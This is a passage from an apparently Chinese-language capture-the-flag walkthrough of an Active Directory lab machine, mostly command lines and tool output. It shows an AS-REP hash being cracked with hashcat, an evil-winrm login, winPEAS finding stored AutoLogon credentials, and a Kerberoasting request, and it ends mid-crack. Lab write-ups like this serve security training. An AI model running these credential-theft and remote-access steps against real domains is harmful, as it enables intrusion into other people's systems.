/usr/share/wordlists/rockyou.txt<br>[sudo] kali 的密码：<br>hashcat (v6<span class="hljs-number">.2</span><span class="hljs-number">.6</span>) starting<br><br>OpenCL <span class="hljs-title function_">API</span> <span class="hljs-params">(OpenCL <span class="hljs-number">3.0</span> PoCL <span class="hljs-number">5.0</span>+debian  Linux, None+Asserts, RELOC, SPIR, LLVM <span class="hljs-number">15.0</span><span class="hljs-number">.7</span>, SLEEF, POCL_DEBUG)</span> - Platform #1 [The pocl project]<br>==========================================================================================================================================<br>* Device #<span class="hljs-number">1</span>: cpu-<span class="hljs-number">-0x000</span>, <span class="hljs-number">1439</span>/<span class="hljs-number">2942</span> MB (<span class="hljs-number">512</span> MB allocatable), <span class="hljs-number">4</span>MCU<br><br>Minimum password length supported by kernel: <span class="hljs-number">0</span><br>Maximum password length supported by kernel: <span class="hljs-number">256</span><br><br>Hashes: <span class="hljs-number">1</span> digests; <span class="hljs-number">1</span> unique digests, <span class="hljs-number">1</span> unique salts<br>Bitmaps: <span class="hljs-number">16</span> bits, <span class="hljs-number">65536</span> entries, <span class="hljs-number">0x0000ffff</span> mask, <span class="hljs-number">262144</span> bytes, <span class="hljs-number">5</span>/<span class="hljs-number">13</span> rotates<br>Rules: <span class="hljs-number">1</span><br><br>Optimizers applied:<br>* Zero-Byte<br>* Not-Iterated<br>* Single-Hash<br>* Single-Salt<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to <span class="hljs-keyword">switch</span> to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature <span class="hljs-built_in">abort</span> trigger <span class="hljs-built_in">set</span> to <span class="hljs-number">90</span>c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: <span class="hljs-number">0</span> MB<br><br>Dictionary cache hit:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: <span class="hljs-number">14344385</span><br>* Bytes.....: <span class="hljs-number">139921507</span><br>* Keyspace..: <span class="hljs-number">14344385</span><br><br>Cracking performance lower than expected?                 <br><br>* Append -O to the commandline.<br>  This lowers the maximum supported password/salt <span class="hljs-title function_">length</span> <span class="hljs-params">(usually down to <span class="hljs-number">32</span>)</span>.<br><br>* Append -w 3 to the commandline.<br>  This can cause your screen to lag.<br><br>* Append -S to the commandline.<br>  This has a drastic speed impact but can be better <span class="hljs-keyword">for</span> specific attacks.<br>  Typical scenarios are a small wordlist but a large ruleset.<br><br>* Update your backend API runtime / driver the right way:<br>  https:<span class="hljs-comment">//hashcat.net/faq/wrongdriver</span><br><br>* Create more work items to make use of your parallelization power:<br>  https:<span class="hljs-comment">//hashcat.net/faq/morework</span><br><br>$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:0a556391e31d0d84bd6368c3dc76808e$5b2fe3ca4b7847e0e51e157fdbe399f70583e42c31e08165f461a2ab61d33a56342fb009cf78d62cf5daf8600fc6c65ac2c5e4b74181ddadca8762f552037edbc8821243273247ef9189f734f266db2ce218da518fd8153c4e302cad8a93b960f595425c340f9e0facc109e5a0f09ef924ae2901daacb70154da8944b5c420dba0aecacefde66d6a6ac94229d37d34778fb6b0b29e4fd1b37faed9bd7bba7abc36d52c9476bfacc943da287231e827d9792e6028b90602fff3f0846a2f7a5c701a90f54b3ff698deb2152953e01eaebec97b968946aaefbde4fcbae037f219cf590083a6a8d95caad6fbee598393259f6041919731796361ed8076f1cf76d1b7:Thestrokes23<br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 18200 <span class="hljs-params">(Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, AS-REP)</span><br>Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:0a55639...76d1b7<br>Time.Started.....: Fri May 10 02:26:43 2024 <span class="hljs-params">(<span class="hljs-number">6</span> secs)</span><br>Time.Estimated...: Fri May 10 02:26:49 2024 <span class="hljs-params">(<span class="hljs-number">0</span> secs)</span><br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: <span class="hljs-title function_">File</span> <span class="hljs-params">(/usr/share/wordlists/rockyou.txt)</span><br>Guess.Queue......: 1/1 <span class="hljs-params">(<span class="hljs-number">100.00</span>%)</span><br>Speed.#1.........:  1842.8 kH/<span class="hljs-title function_">s</span> <span class="hljs-params">(<span class="hljs-number">0.46</span>ms)</span> @ Accel:256 Loops:1 Thr:1 Vec:4<br>Recovered........: 1/1 <span class="hljs-params">(<span class="hljs-number">100.00</span>%)</span> <span class="hljs-title function_">Digests</span> <span class="hljs-params">(total)</span>, 1/1 <span class="hljs-params">(<span class="hljs-number">100.00</span>%)</span> <span class="hljs-title function_">Digests</span> <span class="hljs-params">(new)</span><br>Progress.........: 10539008/14344385 <span class="hljs-params">(<span class="hljs-number">73.47</span>%)</span><br>Rejected.........: 0/10539008 <span class="hljs-params">(<span class="hljs-number">0.00</span>%)</span><br>Restore.Point....: 10537984/14344385 <span class="hljs-params">(<span class="hljs-number">73.46</span>%)</span><br>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1<br>Candidate.Engine.: Device Generator<br>Candidates.#1....: Throy1 -&gt; Thelittlemermaid<br>Hardware.Mon.#1..: Util: 80%<br><br>Started: Fri May 10 02:26:32 2024<br></code></pre></td></tr></table></figure>
+
+<p>9、拿破解的账号密码，直接使用evil-winrm进行登录靶机</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ evil-winrm -i <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span> -u fsmith -p <span class="hljs-string">&#x27;Thestrokes23&#x27;</span><br>                                        <br>Evil-WinRM shell v3<span class="hljs-number">.5</span><br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; whoami<br>egotisticalbank\fsmith<br>*Evil-WinRM* PS C:\Users\FSmith\Documents&gt;<br></code></pre></td></tr></table></figure>
+
+<p>10、直接获取下第一个flag信息吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; ls C:/Users<br><br><br>    Directory: C:\Users<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        <span class="hljs-number">1</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">1</span>:<span class="hljs-number">05</span> PM                Administrator<br>d-----        <span class="hljs-number">1</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">9</span>:<span class="hljs-number">52</span> AM                FSmith<br>d-r---        <span class="hljs-number">1</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">9</span>:<span class="hljs-number">32</span> PM                Public<br>d-----        <span class="hljs-number">1</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">4</span>:<span class="hljs-number">05</span> PM                svc_loanmgr<br><br><br>*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; cd ../Desktop<br>*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; ls<br><br><br>    Directory: C:\Users\FSmith\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-ar---         <span class="hljs-number">5</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">7</span>:<span class="hljs-number">45</span> AM             <span class="hljs-number">34</span> user.txt<br><br><br>*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; type user.txt<br>af42672d722ddf2d3b394aa2be63045e<br>*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>11、先枚举下当前用户信息吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; whoami /priv<br><br>PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                    State<br>============================= ============================== =======<br>SeMachineAccountPrivilege     Add workstations to domain     Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-built_in">set</span> Enabled<br>*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; net user fsmith<br>User name                    FSmith<br>Full Name                    Fergus Smith<br>Comment<br>User<span class="hljs-number">&#x27;</span>s comment<br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last <span class="hljs-built_in">set</span>            <span class="hljs-number">1</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2020</span> <span class="hljs-number">9</span>:<span class="hljs-number">45</span>:<span class="hljs-number">19</span> AM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">1</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2020</span> <span class="hljs-number">9</span>:<span class="hljs-number">45</span>:<span class="hljs-number">19</span> AM<br>Password required            Yes<br>User may change password     Yes<br><br>Workstations allowed         All<br>Logon script<br>User profile<br>Home directory<br>Last logon                   <span class="hljs-number">5</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2024</span> <span class="hljs-number">1</span>:<span class="hljs-number">28</span>:<span class="hljs-number">24</span> PM<br><br>Logon hours allowed          All<br><br>Local Group Memberships      *Remote Management Use<br>Global Group memberships     *Domain Users<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; net localgroup<br><br>Aliases <span class="hljs-keyword">for</span> \\SAUNA<br><br>-------------------------------------------------------------------------------<br>*Access Control Assistance Operators<br>*Account Operators<br>*Administrators<br>*Allowed RODC Password Replication Group<br>*Backup Operators<br>*Cert Publishers<br>*Certificate Service DCOM Access<br>*Cryptographic Operators<br>*Denied RODC Password Replication Group<br>*Distributed COM Users<br>*DnsAdmins<br>*Event Log Readers<br>*Guests<br>*Hyper-V Administrators<br>*IIS_IUSRS<br>*Incoming Forest Trust Builders<br>*Network Configuration Operators<br>*Performance Log Users<br>*Performance Monitor Users<br>*Pre-Windows <span class="hljs-number">2000</span> Compatible Access<br>*Print Operators<br>*RAS and IAS Servers<br>*RDS Endpoint Servers<br>*RDS Management Servers<br>*RDS Remote Access Servers<br>*Remote Desktop Users<br>*Remote Management Users<br>*Replicator<br>*Server Operators<br>*Storage Replica Administrators<br>*Terminal Server License Servers<br>*Users<br>*Windows Authorization Access Group<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; <br><br><br>*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; net user /domain<br><br>User accounts <span class="hljs-keyword">for</span> \\<br><br>-------------------------------------------------------------------------------<br>Administrator            FSmith                   Guest<br>HSmith                   krbtgt                   svc_loanmgr<br>The command completed with one or more errors.<br><br>*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<p>12、信息量上不太多，还是上 winpeas.exe 工具批量枚举下吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; upload /home/kali/Desktop/tools/winPEASx64.exe<br>                                        <br>Info: Uploading /home/kali/Desktop/tools/winPEASx64.exe to C:\Users\FSmith\Desktop\winPEASx64.exe<br>                                        <br>Data: <span class="hljs-number">3183272</span> bytes of <span class="hljs-number">3183272</span> bytes copied<br>                                        <br>Info: Upload successful!<br>*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; ./winPEASx64.exe<br><br>=================================================================================================<br><br>   Computer Name           :   SAUNA<br>   User Name               :   HSmith<br>   User Id                 :   <span class="hljs-number">1103</span><br>   Is Enabled              :   True<br>   User Type               :   User<br>   Comment                 :<br>   Last Logon              :   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1970</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM<br>   Logons Count            :   <span class="hljs-number">0</span><br>   Password Last Set       :   <span class="hljs-number">1</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2020</span> <span class="hljs-number">10</span>:<span class="hljs-number">54</span>:<span class="hljs-number">34</span> PM<br><br>=================================================================================================<br><br>   Computer Name           :   SAUNA<br>   User Name               :   svc_loanmgr<br>   User Id                 :   <span class="hljs-number">1108</span><br>   Is Enabled              :   True<br>   User Type               :   User<br>   Comment                 :<br>   Last Logon              :   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1970</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM<br>   Logons Count            :   <span class="hljs-number">0</span><br>   Password Last Set       :   <span class="hljs-number">1</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2020</span> <span class="hljs-number">4</span>:<span class="hljs-number">48</span>:<span class="hljs-number">31</span> PM<br><br>=================================================================================================<br><br><br>Looking <span class="hljs-keyword">for</span> AutoLogon credentials<br>    Some AutoLogon credentials were found<br>    DefaultDomainName             :  EGOTISTICALBANK<br>    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager<br>    DefaultPassword               :  Moneymakestheworldgoround!<br></code></pre></td></tr></table></figure>
+
+<p>13、这里发现了个默认密码，还有几个状态正常的账号信息，下面检查下这几个账号信息吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; net user svc_loanmgr<br>User name                    svc_loanmgr<br>Full Name                    L Manager<br>Comment<br>User<span class="hljs-number">&#x27;</span>s comment<br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last <span class="hljs-built_in">set</span>            <span class="hljs-number">1</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2020</span> <span class="hljs-number">4</span>:<span class="hljs-number">48</span>:<span class="hljs-number">31</span> PM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">1</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2020</span> <span class="hljs-number">4</span>:<span class="hljs-number">48</span>:<span class="hljs-number">31</span> PM<br>Password required            Yes<br>User may change password     Yes<br><br>Workstations allowed         All<br>Logon script<br>User profile<br>Home directory<br>Last logon                   Never<br><br>Logon hours allowed          All<br><br>Local Group Memberships      *Remote Management Use<br>Global Group memberships     *Domain Users<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; <br><br><br>*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; net user HSmith<br>User name                    HSmith<br>Full Name                    Hugo Smith<br>Comment<br>User<span class="hljs-number">&#x27;</span>s comment<br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last <span class="hljs-built_in">set</span>            <span class="hljs-number">1</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2020</span> <span class="hljs-number">10</span>:<span class="hljs-number">54</span>:<span class="hljs-number">34</span> PM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">1</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2020</span> <span class="hljs-number">10</span>:<span class="hljs-number">54</span>:<span class="hljs-number">34</span> PM<br>Password required            Yes<br>User may change password     Yes<br><br>Workstations allowed         All<br>Logon script<br>User profile<br>Home directory<br>Last logon                   Never<br><br>Logon hours allowed          All<br><br>Local Group Memberships<br>Global Group memberships     *Domain Users<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\FSmith\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<p>14、看用户组也很普通，没啥情况，那继续尝试下 kerberoasting攻击吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-GetUserSPNs -request -dc-ip <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.175</span> egotistical-bank.local/fsmith:Thestrokes23<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation <br>----------------------------------------  ------  --------  --------------------------  ---------  ----------<br>SAUNA/HSmith.EGOTISTICALBANK.LOCAL:<span class="hljs-number">60111</span>  HSmith            <span class="hljs-number">2020</span><span class="hljs-number">-01</span><span class="hljs-number">-23</span> <span class="hljs-number">13</span>:<span class="hljs-number">54</span>:<span class="hljs-number">34.140321</span>  &lt;never&gt;               <br><br>[-] CCache file is not found. Skipping...<br>$krb5tgs$<span class="hljs-number">23</span>$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$cf98868809279887e2ad034a9d23cd4a$<span class="hljs-number">85212b</span>1895397574cc5445dd617a63a0ff4746693d7718c141984a066830446ac0423b55e7074031db7984f0621a9eefe2c9ebfaac73c83bd9122f9b360e7a45e975453f9711b33c550185e94d18c4def816a5db45bb792f53d7c58e6b3fbf23c3072dc48bbcbb993195ce7fe0ca4825283e9c41c37e9bae8f961efa0b1d1ebd82403c017d0a67276094e475bc781ca8f088220c5b1e870cc72a1db25bc991fb2d241814008dff1d7e712b460c58eed1da4f82d58aa8bdecc99ce8456e2b7c67847c8a27437422ba2e2e433ace4f82b15f26c864a2537c54f97ac971973a1b59fe32dfbbd0438adcf437c733544be850e46fceea9e93f6d31c19ac8292cb78f24684d5581d02735f76663c4e335d92d1ea9aa8e9b47678d287561c49f38dc8fcd335b98782dec427e61acebed5b9d5ef674d980ca48b7da0f69fadcf50c34ebb999c5f1b8dddc4466adfb9f72b0ef986a7db20036cbff4c16a8658d2410bd6f351665a512feaa957edbce6ee70f8e6c2d6578e22ed5fb08d841c7d176ec0e0606ab807fd7e3335fc25c56a5601a951ca909fa6a4e2ec694b2900aabf87ab5ead17d6d830c2a0f38e79217e79db47e5862eee1e1c858c69ed7f49c1a2398b0df40baf22c844e609a59d1ec7faaffad2dabce0af00f7817628f7ce3e9f62bb3f5d5fe5a05be790a1b086c6988cedc8c79b43a77fc618a7c259c6458d2c790d587b2e4a80938c18fd4756d9f576c54ba97e5e95ff91eb0102ef48abc1bd1c7d13d5f2369619e27d613b9e2bfd2a70fa6fba2231b1b8987aaa35b465a5818be62d82ab4e6c3c7de24512b54e4390332c0354075e4f10b59f5ac905e4069a5004a67d731f5cf4214ae86ef0fa2967e144cd67e8e8370eb3cadf2a110fba65a725da0483c814f0ec2be895524038bf8bfb2fe53b22d7aa4599fd7d737ce4f079a0719ce8560db7e3b41d76e8eb7c854614248ee0ff893d47b8ef3f4d3f9a06e8c7673f3f6b55e047e4f15fda20c82e55916099d41a667622b91b62eb45527b377bc8ceabc806730a3f2e857b723b9080c0c1bd1662361e8b540a762eda10cadccc0db7c37cfc9845573afd30b13b9066c511f0263c051d211bec7e272ac7cf9790ca6e41b416df2db9bf55fcb37fbdfc1d8ea43b6445edae5b775dd95d9cfc3466e726830a0bf22e65e9d6c7348b70e1a2f0ea8d04c8f5587370900f0b2818fccda5892ea8bf8cd2efd5eaf382cff54cdc3b55ea0c68854c86d19e339b960d73cb7b512a8a6a10f5dbd2f0f07ac8bb12c7708fcce636ba26005b1ff50079f0c1774a71ae06f2dcb797f4410b3af65f401173ff0d1c96700fc00a2a3e2b35fb6012b961b051ef0cd23c8be6cc441bf54b635f3c9475e59ffd51c3fd17f8ea4c6b5ec5d671a8f3eea4<br></code></pre></td></tr></table></figure>
+
+<p>15、很好，获取另一个用户的信息了，这里继续哈希破解下吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ hashcat -h | grep -i <span class="hljs-string">&quot;kerberos&quot;</span><br>  <span class="hljs-number">19600</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">17</span>, TGS-REP                              | Network Protocol<br>  <span class="hljs-number">19800</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">17</span>, Pre-Auth                             | Network Protocol<br>  <span class="hljs-number">28800</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">17</span>, DB                                   | Network Protocol<br>  <span class="hljs-number">19700</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">18</span>, TGS-REP                              | Network Protocol<br>  <span class="hljs-number">19900</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">18</span>, Pre-Auth                             | Network Protocol<br>  <span class="hljs-number">28900</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">18</span>, DB                                   | Network Protocol<br>   <span class="hljs-number">7500</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, AS-REQ Pre-Auth                      | Network Protocol<br>  <span class="hljs-number">13100</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, TGS-REP                              | Network Protocol<br>  <span class="hljs-number">18200</span> | Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, AS-REP                               | Network Protocol<br>                                                                                                                <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo hashcat -m <span class="hljs-number">13100</span> ./hash /usr/share/wordlists/rockyou.txt<br>[sudo] kali 的密码：<br>hashcat (v6<span class="hljs-number">.2</span><span class="hljs-number">.6</span>) starting<br><br>OpenCL <span class="hljs-title function_">API</span> <span class="hljs-params">(OpenCL <span class="hljs-number">3.0</span> PoCL <span class="hljs-number">5.0</span>+debian  Linux, None+Asserts, RELOC, SPIR, LLVM <span class="hljs-number">15.0</span><span class="hljs-number">.7</span>, SLEEF, POCL_DEBUG)</span> - Platform #1 [The pocl project]<br>==========================================================================================================================================<br>* Device #<span class="hljs-number">1</span>: cpu-<span class="hljs-number">-0x000</span>, <span class="hljs-number">1439</span>/<span 